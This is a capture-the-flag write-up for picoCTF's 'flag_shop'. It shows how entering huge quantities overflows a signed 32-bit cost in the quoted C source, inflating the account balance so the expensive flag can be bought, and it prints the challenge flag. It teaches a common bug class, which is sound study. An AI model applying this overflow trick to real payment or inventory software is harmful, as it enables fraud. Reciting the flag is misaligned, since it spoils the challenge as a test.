# flag_shop

### Description:

There's a flag shop selling stuff, can you buy a flag?
Additional details will be available after launching your challenge instance.
"Click `Launch Instance`."
`Source`. Connect with nc fickle-tempest.picoctf.net 60269.

Hint: Two's compliment can do some weird things when numbers get really big!

### Commands / Steps:

```bash
# Step 1: Connect to "nc fickle-tempest.picoctf.net 60269". Then, we see the program.
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

# Step 2: Check Available Items
Select option "2. Buy Flags" to see what's for sale:

Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag

# Step 3: The cost for option 1 is only 900 dollars but the second option costs 100000 dollars, which we cannot afford because we only have 1100 dollars in the current balance. Let's look at the source code provided. 
if(auction_choice == 1){
                printf("These knockoff Flags cost 900 each, enter desired quantity\n");
                
                int number_flags = 0;
                fflush(stdin);
                scanf("%d", &number_flags);
                if(number_flags > 0){
                    int total_cost = 0;
                    total_cost = 900*number_flags;
                    printf("\nThe final cost is: %d\n", total_cost);
                    if(total_cost <= account_balance){
                        account_balance = account_balance - total_cost;
                        printf("\nYour current balance after transaction: %d\n\n", account_balance);
                    }
                    else{
                        printf("Not enough funds to complete purchase\n");
                    }
                                    
                    
                }                                           
            }

# Step 4: Given that the source is written in C, the variable 'total_cost' is a signed int which can handle '2,147,483,647' as the maximum value. If we enter that value into the flag sale, option 1, Defintely not the flag Flag, we get integer overflow and our balance is increased. 
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
2147483647

The final cost is: -900

Your current balance after transaction: 2000

# Step 5: If we refer to the source code provided again, we can get a huge sum of money in our balance if we enter the quantity of the number of more than (2147483647/900). 
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
2390000

The final cost is: -2143967296

Your current balance after transaction: 2143969296

**Result:** Instead of paying money, we gained over 2 billion dollars due to integer overflow!

# Step 6: Then we can buy the 1337 flag and get the flag. 
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_bag5_39AF2bE1}
```

### Flag:

> picoCTF{m0n3y_bag5_39AF2bE1}

### Notes / Tips

- Integer overflow occurs when numbers exceed the maximum value for signed 32-bit integers (2,147,483,647)
- In C, `int max_val = 2147483647; int overflow = max_val + 1;` results in a negative number due to two's complement
- To exploit: calculate when `price * quantity > 2,147,483,647` — try `quantity > INT_MAX / price`
- Always check source code for arithmetic operations without bounds checking 


